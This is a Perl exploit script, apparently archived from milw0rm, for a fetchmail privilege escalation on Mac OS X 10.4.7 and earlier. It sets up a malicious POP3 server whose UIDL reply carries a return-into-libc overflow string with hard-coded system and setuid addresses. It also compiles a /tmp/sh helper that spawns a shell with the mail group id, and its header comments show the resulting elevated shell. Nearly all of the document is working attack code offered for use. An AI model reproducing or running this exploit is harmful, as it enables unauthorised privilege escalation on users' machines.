<html><head><title>Mac OS X <= 10.4.7 fetchmail Privilege Escalation Exploit (x86)</title></head><pre>#!/usr/bin/perl
# getpwnedmail.pl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) 
#
# This is a canibalized version of &quot;Kansas City POP Daemon Version 0.0&quot; - Copyright (c) 1999 David Nicol &lt;davidnicol@acm.org&gt;
#
# kevin-finisterres-mac-mini:~ kfinisterre$ /usr/bin/fetchmail -p pop3 --fastuidl 1 localhost -P 1234
# Enter password for kfinisterre@localhost: 
# sh-2.05b$ id
# uid=501(kfinisterre) gid=501(kfinisterre) egid=6(mail) groups=6(mail), 81(appserveradm), 79(appserverusr), 80(admin)
#
# http://docs.info.apple.com/article.html?artnum=106704

use Socket;
use IO::Handle;
use IO::Socket;

$banner = &quot;     /tmp/sh                  &quot;;
$cmd = $banner ; 

$ebp = 0x41424344; 
$system = 0x900474e0; # NX is a problem use return into libc
$setuid = 0x90033da0; 
$cmdstr = 0xbfffd923; # (gdb) x/10s $esp+131    - 0xbfffd8e3:      &quot;     /tmp/sh           &quot;

$malstr = &quot;A&quot; x 286 . pack('l', $ebp) . pack('l', $system) . pack('l', $setuid) . pack('l', $cmdstr) ;
        
open(SUSH,&quot;&gt;/tmp/aaa.c&quot;);
printf SUSH &quot;int main(){setegid(6);setgid(6);system(\&quot;/bin/sh\&quot;);}\n&quot;;
system(&quot;PATH=$PATH:/usr/bin/ cc -o /tmp/sh /tmp/aaa.c&quot;);

$PortNumber  = 1234;
$door = IO::Socket::INET-&gt;new( Proto=&gt;'tcp', LocalPort=&gt;$PortNumber, Listen=&gt;SOMAXCONN, Reuse=&gt;1 );
die &quot;Cannot set up socket: $!&quot; unless $door;

$timeout = 60;
$SIG{ALRM} = sub { die &quot;alarm or timeout\n&quot; };

print &quot;open a new window and type - \&quot;/usr/bin/fetchmail -p pop3 --fastuidl 1 localhost -P 1234\&quot;\n&quot;;
print &quot;choose any password and press enter\n&quot;; 
for(;;)
{
	until(  $client = $door-&gt;accept())
	{
		sleep 1;
        };
	$F = fork;
	die &quot;Fork weirdness: $!&quot; if $F &lt; 0;

        if($F)
	{
		close $client;
		next;
	};
                
        close ($door);

        $client-&gt;autoflush();
	&amp;AUTHORIZATION;
	&amp;TRANSACTION;
	exit;
};

sub OK($)
{
	my $A = shift;
        $A =~ s/\s+\Z//g;
        print $client &quot;+OK $A\r\n&quot;;
	alarm $timeout;
};

sub ERR($)
{
	my $A = shift;
        $A =~ s/\s+/ /g;
        $A =~ s/\s+\Z//g;
        print $client &quot;-ERR $A\r\n&quot;;
	alarm $timeout;
};

sub AUTHORIZATION
{
	$Name = '';
	OK &quot;$banner&quot;;
	NEEDUSER:
        $Data = &lt;$client&gt;;
        ($Name) =  $Data =~ m/^user (\w+)/i;
	unless($Name)
	{
		ERR &quot;The itsy bitsy spider walked up the water spout&quot;;
		die if ++$strikes &gt; 5;
		goto NEEDUSER;
	};
	OK &quot;User name ($Name) ok. Password, please.&quot;;
        $Data = &lt;$client&gt;;
        my($Pass) =  $Data =~ m/^pass (.*)/i;
	$Pass =~ s/\s+\Z//g;
	
	OK &quot;$Name has &quot; . 8 . &quot; messages&quot;;
};

sub TRANSACTION
{
	%deletia = ();
	START:
        $_ = $Data = &lt;$client&gt;;
	unless(defined($Data))
	{
		print &quot;Client closed connection\n&quot;;
		exit;
	};
	if (m/^STAT/i){ &amp;STAT; goto START};
	if (m/^UIDL/i){ &amp;UIDL; goto START};

	# Just cram the shellcode onto the stack... 
	ERR &quot;Welcome to Pwndertino !  $cmd&quot;;

	goto START;
}

sub STAT
{
	alarm 0;	
	$mm = 0;
	$nn = scalar(@Messages);
	foreach $M (@Messages){
		$mm += -s &quot;$M&quot;;
	};
	OK &quot;8 7035&quot;;
};

sub List($)
{
	my $M = $Messages[$_[0]-1];
	return if $deletia{$M};
	print $client $_[0],' ',(-s $M).&quot;\r\n&quot;;
	alarm $timeout;
};

sub UIDL
{
	print &quot;Sending exploit string\n&quot;;
	OK &quot;1 &quot; . $malstr; 
};

# milw0rm.com [2006-08-01]</pre></html>